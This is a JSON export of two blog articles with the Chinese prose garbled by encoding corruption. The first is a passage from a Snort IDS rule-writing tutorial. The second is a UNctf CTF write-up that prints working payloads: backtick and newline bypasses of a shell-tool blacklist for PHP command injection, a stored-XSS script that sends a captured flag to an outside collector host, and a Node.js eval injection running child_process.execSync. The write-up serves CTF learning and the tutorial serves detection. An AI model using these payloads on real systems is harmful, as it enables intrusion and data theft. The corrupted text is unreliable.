·è®°å½•æ•°æ®åŒ…ã€‚</li>\n<li>activateâ€”åŠ¨ä½œé€‰é¡¹activateåŠŸèƒ½å¼ºå¤§ï¼Œå½“è¢«è§„åˆ™è§¦å‘æ—¶ç”ŸæˆæŠ¥è­¦ï¼Œå¹¶å¯åŠ¨ç›¸å…³çš„dynamicç±»å‹è§„åˆ™ã€‚åœ¨æ£€æµ‹å¤æ‚çš„æ”»å‡»ï¼Œæˆ–å¯¹æ•°æ®è¿›è¡Œå½’ç±»æ—¶ï¼Œè¯¥åŠ¨ä½œé€‰é¡¹ç›¸å½“æœ‰ç”¨ã€‚é™¤äº†ä»¥ä¸Š5ç§é¢„ç½®çš„è§„åˆ™åŠ¨ä½œç±»å‹ï¼Œç”¨æˆ·è¿˜å¯ä»¥å®šåˆ¶è‡ªå·±çš„ç±»å‹ã€‚</li>\n</ol>\n<p>è§„åˆ™ä½“çš„ä½œç”¨æ˜¯åœ¨è§„åˆ™å¤´ä¿¡æ¯çš„åŸºç¡€ä¸Šè¿›ä¸€æ­¥åˆ†æï¼Œæœ‰äº†å®ƒæ‰èƒ½ç¡®è®¤å¤æ‚çš„æ”»å‡»(Snortçš„è§„åˆ™å®šä¹‰ä¸­å¯ä»¥æ²¡æœ‰è§„åˆ™ä½“)ã€‚è§„åˆ™ä½“ç”±è‹¥å¹²ä¸ªè¢«åˆ†åˆ«éš”å¼€çš„ç‰‡æ–­ç»„æˆï¼Œæ¯ä¸ªç‰‡æ–­å®šä¹‰äº†ä¸€ä¸ªé€‰é¡¹å’Œç›¸åº”çš„é€‰é¡¹å€¼ã€‚ä¸€éƒ¨åˆ†é€‰é¡¹æ˜¯å¯¹å„ç§åè®®çš„è¯¦ç»†è¯´æ˜ï¼ŒåŒ…æ‹¬IPã€ICMPå’ŒTCPåè®®ï¼Œå…¶ä½™çš„é€‰é¡¹æ˜¯ï¼šè§„åˆ™è§¦å‘æ—¶æä¾›ç»™ç®¡ç†å‘˜çš„å‚è€ƒä¿¡æ¯ï¼Œè¢«æœç´¢çš„å…³é”®å­—ï¼ŒSnortè§„åˆ™çš„æ ‡è¯†å’Œå¤§å°å†™ä¸æ•æ„Ÿé€‰é¡¹ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªè§„åˆ™å®ä¾‹ã€‚</p>\n<pre><code>alert tcp !192.168.43.0/24 any -&gt;any 21 (content:&quot;USER&quot;;msg: &quot;FTP Login&quot;;)</code></pre><ol>\n<li><code>alert</code>è¡¨ç¤ºè§„åˆ™åŠ¨ä½œä¸ºæŠ¥è­¦ã€‚                                         </li>\n<li><code>tcp</code>è¡¨ç¤ºåè®®ç±»å‹ä¸ºTCPåè®®ã€‚ </li>\n<li><code>!192.168.0.1/24</code>è¡¨ç¤ºæºIPåœ°å€ä¸æ˜¯192.168.0.1/24ã€‚ </li>\n<li>ç¬¬ä¸€ä¸ª<code>any</code>è¡¨ç¤ºæºç«¯å£ä¸ºä»»æ„ç«¯å£ã€‚                            </li>\n<li><code>-&gt;</code>è¡¨ç¤ºå‘é€æ–¹å‘æ“ä½œç¬¦ï¼Œæ–¹å‘æ“ä½œç¬¦å·¦è¾¹çš„ipåœ°å€å’Œç«¯å£å·è¢«è®¤ä¸ºæ˜¯æµæ¥è‡ªçš„æºä¸»æœº</li>\n<li>ç¬¬äºŒä¸ªanyè¡¨ç¤ºç›®çš„IPåœ°å€ä¸ºä»»æ„IPåœ°å€ã€‚</li>\n<li>21è¡¨ç¤ºç›®çš„ç«¯å£ä¸º21ã€‚ </li>\n<li><code>content:&quot;USER&quot;</code>è¡¨ç¤ºåŒ¹é…çš„å­—ç¬¦ä¸²ä¸ºâ€œUSERâ€ã€‚      </li>\n<li><code>msg:&quot;FTPLogin&quot;</code>è¡¨ç¤ºæŠ¥è­¦ä¿¡æ¯ä¸ºâ€œFTPLoginâ€</li>\n</ol>\n<p>é¢„å¤„ç†å™¨åœ¨è°ƒç”¨æ£€æµ‹å¼•æ“ä¹‹å‰ï¼Œåœ¨æ•°æ®åŒ…è¢«è§£ç ä¹‹åè¿è¡Œã€‚é€šè¿‡è¿™ç§æœºåˆ¶ï¼ŒSnortå¯ä»¥ä»¥ä¸€ç§<code>out of band</code>çš„æ–¹å¼å¯¹æ•°æ®åŒ…è¿›è¡Œä¿®æ”¹æˆ–è€…åˆ†æã€‚<br>é¢„å¤„ç†å™¨å¯ä»¥ä½¿ç”¨<code>preprocessor</code>å…³é”®è¯æ¥åŠ è½½å’Œé…ç½®ï¼Œå¸¸ç”¨åˆ°çš„é¢„å¤„ç†å™¨å¦‚ä¸‹:</p>\n<ol>\n<li><code>HTTPdecode</code>é¢„å¤„å™¨HTTPè§£ç é¢„å¤„ç†æ¨¡å—ç”¨æ¥å¤„ç†HTTPURLå­—ç¬¦ä¸²ï¼ŒæŠŠå®ƒä»¬è½¬æ¢ä¸ºæ¸…æ™°çš„ASCIIå­—ç¬¦ä¸²ã€‚</li>\n<li>ç«¯å£æ‰«æå™¨<code>portscan</code>ç«¯å£æ‰«æå™¨ä¼šæŠŠç”±å•ä¸ªæºIPåœ°å€å‘èµ·çš„ç«¯å£æ‰«æä»å¼€å§‹åˆ°ç»“æŸçš„å…¨è¿‡ç¨‹è®°å½•åˆ°æ ‡å‡†æ—¥å¿—ã€‚</li>\n<li><code>stream</code>å¤„ç†å™¨streamå¤„ç†å™¨ä¸ºsnortæä¾›äº†TCPæ•°æ®åŒ…é‡ç»„çš„åŠŸèƒ½ã€‚åœ¨é…ç½®çš„ç«¯å£ä¸Šï¼Œstreamå¤„ç†å™¨èƒ½å¤Ÿå¯¹TCPæ•°æ®åŒ…çš„ç»†å°ç‰‡æ®µè¿›è¡Œé‡ç»„ï¼Œä½¿ä¹‹æˆä¸ºå®Œæ•´çš„TCPæ•°æ®åŒ…ï¼Œç„¶åsnortå¯ä»¥å¯¹å…¶å¯ç–‘è¡Œä¸ºè¿›è¡Œæ£€æŸ¥ã€‚</li>\n<li><code>frag2</code>å¤„ç†å™¨frag2é¢„å¤„ç†å™¨ä¸ºsnortæä¾›äº†IPåˆ†ç‰‡é‡ç»„çš„åŠŸèƒ½ã€‚frag2é¢„å¤„ç†å™¨èƒ½å¤Ÿå¯¹åˆ†ç‰‡åŒ…è¿›è¡Œé‡ç»„æ¥å®šä½åˆ†ç‰‡æ”»å‡»ï¼Œå®ƒçš„å·¥ä½œåŸç†æ˜¯å°†æ‰€æœ‰çš„åˆ†ç‰‡é‡ç»„æ„é€ æˆä¸€ä¸ªåŒ…å«å®Œæ•´ä¿¡æ¯çš„æ•°æ®åŒ…ï¼Œå†å°†è¿™ä¸ªåŒ…ä¼ ç»™æ£€æµ‹å¼•æ“ã€‚</li>\n</ol>\n<h3 id=\"ç¼–å†™è§„åˆ™\"><a href=\"#ç¼–å†™è§„åˆ™\" class=\"headerlink\" title=\"ç¼–å†™è§„åˆ™\"></a>ç¼–å†™è§„åˆ™</h3><p>æˆ‘ä»¬åœ¨ä½¿ç”¨å¼€å§‹å‰ä¸€å®šè¦æ³¨æ„é€‰æ‹©å¥½ç½‘å¡ï¼Œåœ¨snort.exeæ–‡ä»¶æ‰€åœ¨ç›®å½•ç”¨<code>snort -W</code>æŸ¥çœ‹ç³»ç»Ÿå¯ç”¨ç½‘ç»œæ¥å£ã€‚è®°ä½éœ€è¦ç›‘è§†çš„ç½‘å¡çš„ç¼–å·ï¼Œæ¯”å¦‚ä¸º2ï¼Œé‚£ä¹ˆåœ¨ä»¥åçš„ä½¿ç”¨ä¸­ï¼Œç”¨<code>-i 2</code>å°±å¯ä»¥é€‰æ‹©å¯¹åº”çš„ç½‘å¡ã€‚</p>\n<p>æˆ‘ä»¬å…ˆæ–°å»ºè§„åˆ™</p>\n<pre><code>alert icmp any any -&gt; 192.168.43.137 any (msg:ï¼‚ICMP PINGï¼‚;sid:10000)</code></pre><p>ipåœ°å€æ˜¯æˆ‘çš„ä¸»æœºipã€‚è¿™æ¡è§„åˆ™çš„æ„æ€å°±æ˜¯ å¯¹æ¥è‡ªä»»ä½•åœ°å€çš„<code>icmp</code>æ•°æ®åŒ…å‘å‡ºè­¦å‘Šä¿¡æ¯.</p>\n<p>æ‰§è¡Œå‘½ä»¤ï¼š</p>\n<pre><code>snort -i 2 -c ../etc/snort.conf -l ./log</code></pre><p>æˆ‘ä»¬å°†ç¼–å†™çš„è§„åˆ™å†™å…¥<code>snort.conf</code>ä¸­ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦ <code>-c</code> æ¥æŒ‡å®šæˆ‘ä»¬ç”¨çš„è§„åˆ™ï¼Œå¹¶å°†æ—¥å¿—è®°å½•åˆ° log æ–‡ä»¶åŠ ä¸­ã€‚</p>\n<p>æ—¥å¿—æ˜¯äºŒè¿›åˆ¶ä¿å­˜çš„ï¼Œå¯¹äºæŸ¥çœ‹æ—¥å¿—æ–‡ä»¶æˆ‘ä»¬éœ€è¦æ‰§è¡Œ</p>\n<pre><code>snort -dvr snort.log.xxxx</code></pre><h2 id=\"å¦‚ä½•ä½¿ç”¨0x02\"><a href=\"#å¦‚ä½•ä½¿ç”¨0x02\" class=\"headerlink\" title=\"å¦‚ä½•ä½¿ç”¨0x02\"></a>å¦‚ä½•ä½¿ç”¨0x02</h2><h3 id=\"ä½¿ç”¨-snort-æ£€æµ‹å±€åŸŸç½‘å†…-sqlmap-è¡Œä¸º\"><a href=\"#ä½¿ç”¨-snort-æ£€æµ‹å±€åŸŸç½‘å†…-sqlmap-è¡Œä¸º\" class=\"headerlink\" title=\"ä½¿ç”¨ snort æ£€æµ‹å±€åŸŸç½‘å†… sqlmap è¡Œä¸º\"></a>ä½¿ç”¨ snort æ£€æµ‹å±€åŸŸç½‘å†… sqlmap è¡Œä¸º</h3><p>å…ˆç¼–å†™è§„åˆ™</p>\n<pre><code>alert any any -&gt; any any (msg:&quot;webscan sqlmap&quot;;content:&quot;sqlmap&quot;;sid=10000;classtype:webscan;rev=1)</code></pre><p>åœ¨ <code>classification.conf</code> ä¸­æ·»åŠ  webscan ç±»å‹çš„è§„åˆ™</p>\n<pre><code>config classfiction æè¿°ï¼Œæè¿°ï¼Œå±é™©ç­‰çº§\nconfig classification:shortname,short description,priority\nconfig classification: webscan,webscan sqlmap,1</code></pre><p>åœ¨ <code>sid-msg.map</code> ä¸­æ·»åŠ é¢„å®šä¹‰æè¿°</p>\n<pre><code>10000 || webscan sqlmap detected || mcafee,98775</code></pre><p>æœ¬åœ°èµ· dvwa ä¹‹åä½¿ç”¨ low çº§åˆ«çš„ sqlæ³¨å…¥ ï¼Œå°†payloadæ”¾å…¥sqlmapï¼Œéšåæ‰“å¼€snortè¿›è¡Œç›‘å¬å‘ç°äº†sqlmapè¡Œä¸ºã€‚</p>\n<p>ä½†æ˜¯è¿™é‡Œå­˜åœ¨é—®é¢˜ï¼Œsnort åœ¨UAå¤´é‡Œæ£€æµ‹åˆ°äº† sqlmap å­—ç¬¦ä¸²ï¼Œç„¶åæ‰“å°äº†è­¦å‘Šä¿¡æ¯ï¼Œè¿™æ ·çš„æ£€æµ‹ä¸å¤Ÿä¸¥è°¨ï¼Œå› ä¸ºæˆ‘ä»¬å¦‚æœåœ¨ sql æ³¨å…¥çš„åœ°æ–¹å¡«å…¥sqlmapå®ƒåŒæ ·ä¼šè§¦å‘ snort è­¦å‘Šã€‚</p>\n<p>æˆ‘ä»¬ä¿®æ”¹åŸæ¥çš„è§„åˆ™ä¸º</p>\n<pre><code>alert any any -&gt; any any (msg:&quot;webscan sqlmap&quot;;content:&quot;User-Agent: sqlmap/&quot;;sid=10000;classtype:webscan;rev=2)</code></pre><p>æ­¤æ—¶æˆ‘ä»¬å°±èƒ½é’ˆå¯¹ UA å¤´è¿›è¡Œç›‘æµ‹(revä¹ŸåŠ ä¸€ï¼Œè·Ÿä¹‹å‰çš„è®°å½•è¿›è¡ŒåŒºåˆ†)ã€‚</p>\n<p>ä½†æ˜¯ sqlmap å…¶å®å¯ä»¥ç»•è¿‡ UA å¤´çš„æ£€æµ‹ï¼Œæˆ‘ä»¬åœ¨ sqlmap ä¸­æ·»åŠ  <code>random-agent</code> å‚æ•°ï¼Œå°±å¯ä»¥ä½¿ç”¨ä¸åŒçš„ UA ã€‚</p>\n<p>å¦å¤–ï¼Œåœ¨ä½¿ç”¨è§„åˆ™æ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æ·»åŠ å¤šä¸ª content æ¥è¿›è¡Œæ£€æµ‹ï¼š</p>\n<pre><code>alert any any -&gt; any any (msg:&quot;webscan sqlmap&quot;;content:&quot;and&quot;;content:&quot;=&quot;;sid=10001;classtype:webscan;rev=2)</code></pre><p>è¿™æ ·åœ¨åŒ¹é…åˆ°ä¸¤ä¸ªå…³é”®è¯æ—¶å°±ä¼šè§¦å‘è­¦å‘Šã€‚</p>\n<p>å¯¹äºå…¶ä»–çš„æ”»å‡»ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¿é—®æ—¥å¿—æ¥æŠ“å–ä¸åŒçš„è¯·æ±‚ï¼Œç„¶åæ·»åŠ åˆ°å¯¹åº”çš„è§„åˆ™é‡Œã€‚</p>\n<p>é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ¶å®šä¸€ä¸ªä¾æ®è®¿é—®é¢‘ç‡çš„è§„åˆ™ï¼š</p>\n<pre><code>alert any any -&gt; any any (msg:&quot;too many access&quot;;content:&quot;192.168.10.132/login.php&quot;;detection_filter:count 3, second 300,track by_src;sid=10002;classtype:webscan;rev=1)</code></pre><p>è¿™æ ·5åˆ†é’Ÿå†…å‘å‡ºä¸‰æ¬¡è¯·æ±‚å°±ä¼šè¢«æ£€æµ‹åˆ°ã€‚</p>\n","text":"å®‰å…¨é˜²å¾¡-snortSnort IDSï¼ˆå…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼‰æ˜¯ä¸€ä¸ªå¼ºå¤§çš„ç½‘ç»œå…¥ä¾µæ£€æµ‹ç³»ç»Ÿã€‚å®ƒå…·æœ‰å®æ—¶æ•°æ®æµé‡åˆ†æå’Œè®°å½•IPç½‘ç»œæ•°æ®åŒ…çš„èƒ½åŠ›ï¼Œèƒ½å¤Ÿè¿›è¡Œåè®®åˆ†æï¼Œå¯¹ç½‘ç»œæ•°æ®åŒ…å†…å®¹è¿›è¡Œæœç´¢/åŒ¹é…ã€‚å®ƒèƒ½å¤Ÿæ£€æµ‹å„ç§ä¸åŒçš„æ”»å‡»æ–¹å¼ï¼Œå¯¹æ”»å‡»è¿›è¡Œå®æ—¶æŠ¥è­¦ã€‚æ­¤å¤–ï¼ŒSnortæ˜¯å¼€æºçš„å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œå¹¶å…·æœ‰å¾ˆ","link":"","raw":null,"photos":[],"categories":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","count":5,"path":"api/categories/æ¸—é€æµ‹è¯•.json"}],"tags":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","count":3,"path":"api/tags/æ¸—é€æµ‹è¯•.json"}]},{"title":"UNctf èµ›åå›é¡¾","slug":"unctf","date":"2019-11-20T01:26:49.000Z","updated":"2019-12-01T12:59:49.886Z","comments":true,"path":"api/articles/unctf.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"UNctf-èµ›åå›é¡¾\"><a href=\"#UNctf-èµ›åå›é¡¾\" class=\"headerlink\" title=\"UNctf èµ›åå›é¡¾\"></a>UNctf èµ›åå›é¡¾</h1><h2 id=\"bypass\"><a href=\"#bypass\" class=\"headerlink\" title=\"bypass\"></a>bypass</h2><p>é¢˜ç›®æºç ï¼š</p>\n<pre><code>&lt;?php\n    highlight_file(__FILE__);\n    $a = $_GET[&apos;a&apos;];\n    $b = $_GET[&apos;b&apos;];\n // try bypass it\n    if (preg_match(&quot;/\\&apos;|\\&quot;|,|;|\\\\|\\`|\\*|\\n|\\t|\\xA0|\\r|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a))\n        $a = &quot;&quot;;\n        $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;\n    if (preg_match(&quot;/\\&apos;|\\&quot;|;|,|\\`|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $b))\n        $b = &quot;&quot;;\n        $b = &apos;&quot;&apos; . $b . &apos;&quot;&apos;;\n     $cmd = &quot;file $a $b&quot;;\n      str_replace(&quot; &quot;,&quot;&quot;,&quot;$cmd&quot;); \n     system($cmd);\n?&gt;</code></pre><h3 id=\"one-way\"><a href=\"#one-way\" class=\"headerlink\" title=\"one way\"></a>one way</h3><p>æ­£åˆ™é»‘åå•åŒ¹é…ï¼Œå¯¹è¾“å…¥çš„å‚æ•°å¼ºåˆ¶åŠ ä¸ŠåŒå¼•å·ï¼Œå³ä½¿æˆ‘ä»¬ç»•è¿‡æ£€æµ‹ä¹Ÿä¼šè¢«åŠ ä¸ŠåŒå¼•å·æ— æ³•æ‰§è¡Œå‘½ä»¤ã€‚è¿™é‡Œç”¨åˆ°äº†åå¼•å· ```</p>\n<p>è§‚å¯Ÿç¬¬ä¸€ä¸ªæ­£åˆ™ `\\|`` ä¸‰ä¸ªåæ–œæ æ‰èƒ½è½¬ä¹‰åæ–œæ ï¼Œè¿™é‡Œå¯¹ | è¿›è¡Œäº†è½¬ä¹‰ä»è€Œé€ æˆåå¼•å·é€ƒé€¸ã€‚</p>\n<pre><code>&lt;?php\n$a = &quot;`dir`&quot;;\nif (preg_match(&quot;/\\&apos;|\\&quot;|,|;|\\\\|\\`/is&quot;,$a))\n    $a = &quot;&quot;;\n    $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;\n    var_dump($a);\n\nstring(7) &quot;&quot;`dir`&quot;&quot;</code></pre><p>å¯ä»¥çœ‹åˆ°åå¼•å·æˆåŠŸé€ƒé€¸ã€‚</p>\n<p>æˆ‘ä»¬åˆ°é¢˜ç›®ä¸­å°è¯•åˆ—ç›®å½•ï¼Œæ²¡æœ‰ <code>ls</code> å¯ä»¥ç”¨ <code>dir</code></p>\n<pre><code>?a=`dir%20/`\n\nå“åº”ï¼š\n\nbin dev home lib64 mnt proc run srv sys usr boot etc lib media opt root sbin start.sh tmp var: cannot open `bin dev home lib64\\011mnt proc run\\011 srv\\011 sys\\011usr\\012boot etc lib\\011 media\\011opt root sbin start.sh tmp\\011var&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><p>æŸ¥æ‰¾flag </p>\n<pre><code>?a=`/b??/gr??%20-R%20unctf`\n\nå“åº”ï¼š\n.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}: cannot open `.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><h2 id=\"another-way\"><a href=\"#another-way\" class=\"headerlink\" title=\"another way\"></a>another way</h2><p>ç¬¬äºŒä¸ªæ­£åˆ™ <code>\\\\|\\n</code> ä¼šè§£é‡Šä¸ºç«–çº¿å’Œæ¢è¡Œï¼Œæ‰€ä»¥åˆ©ç”¨ <code>%0a</code> è¿›è¡Œæ¢è¡Œç»•è¿‡ï¼ŒåŒæ—¶æœ«å°¾ä½¿ç”¨ <code>%20#</code> æ¥ç»ˆæ­¢å‘½ä»¤å¤„ç†åŒå¼•å·</p>\n<pre><code>?a=\\&amp;b=%0a/???/gr?p%20-R%20ctf%20%23\næ•ˆæœæ˜¯\nfile&quot;\\&quot;&quot;\n/???/gr?p -R ctf #&quot;</code></pre><h2 id=\"easy-xss\"><a href=\"#easy-xss\" class=\"headerlink\" title=\"easy xss\"></a>easy xss</h2><p>åœ¨ç•™è¨€æ¿å¤„æäº¤ xss å‘ç°èƒ½å¤Ÿè§¦å‘ï¼Œè®¿é—®å‚¨å­˜çš„è·¯å¾„å‘ç°ä¸€ä¸ªæ¥å£</p>\n<pre><code>http://112.74.37.15:8010/index.php/treehole/view?id=5dcd1d7bd11a4</code></pre><p>æ­¤æ—¶çš„è¯·æ±‚å¤´é‡Œå¸¦ä¸Šäº† <code>XMLHttpRequest</code> ï¼ŒåŒæ—¶ä¸å¸¦å‚æ•°è®¿é—®æ—¶å¾—åˆ° debug é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ° XHRè¯·æ±‚å¸¦ä¸Šäº† cookie ï¼Œäºæ˜¯æˆ‘ä»¬æ„é€  XHR è¯·æ±‚</p>\n<pre><code>&lt;img src=&apos;/efefefe&apos; onerror=&quot;xmlhttp=new\nXMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){location.href=&apos;http://xssye.com/kOaI/?flag=&apos;\nxmlhttp.responseText.match(&apos;flag\\\\{(.\\*?)\\\\}&apos;)[1]}};xmlhttp.open(&apos;GET&apos;,&apos;/index.php/treehole/view?id=&apos;,true);xmlhttp.send(&apos;&apos;);&quot;/\\&gt;</code></pre><h2 id=\"checkin\"><a href=\"#checkin\" class=\"headerlink\" title=\"checkin\"></a>checkin</h2><p>æŸ¥çœ‹æºç å‘ç°å„ä¸ªæ¥å£</p>\n<pre><code>      switch (e.cmd) {\n        case &apos;name&apos;:\n          this.nickname = e.msg,\n          this.kesshoubanMsg(`Change nickname ${this.nickname\n        }\n         success!`);\n        break;\n      case &apos;error&apos;:\n        this.kesshoubanMsg(`ğŸ™${e.msg\n    }\n    `);\n    break;\n  case &apos;calc&apos;:\n    this.kesshoubanMsg(`${e.msg\n  }\n  `);\n  break;\ncase &apos;flag&apos;:\n  this.kesshoubanMsg(`${e.msg\n}\n`);</code></pre><p>ä¿®æ”¹å®Œåå­—åæµ‹è¯• <code>/calc 1+1</code> å‘ç°æˆåŠŸæ‰§è¡Œï¼Œå­˜åœ¨ä»£ç æ³¨å…¥å‚è€ƒ<a href=\"http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/\" target=\"_blank\" rel=\"noopener\">http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p>\n<p>å°è¯• <code>/calc require(&#39;child_process&#39;).execSync(&#39;cat$IFS/flag&#39;).toString();</code> å…¶ä¸­ç©ºæ ¼è¿‡æ»¤ç»•è¿‡ $IFS ï¼ŒåŒæ—¶Syncé‡‡ç”¨éé˜»å¡è¿”å›ã€‚</p>\n","text":"UNctf èµ›åå›é¡¾bypassé¢˜ç›®æºç ï¼š&lt;?php    highlight_file(__FILE__);    $a = $_GET[&apos;a&apos;];    $b = $_GET[&apos;b&apos;]; // try bypass it    i","link":"","raw":null,"photos":[],"categories":[{"name":"wp","slug":"wp","count":2,"path":"api/categories/wp.json"}],"tags":[{"name":"ctf","slug":"ctf","count":3,"path":"api/tags/ctf.json"},{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}]}]}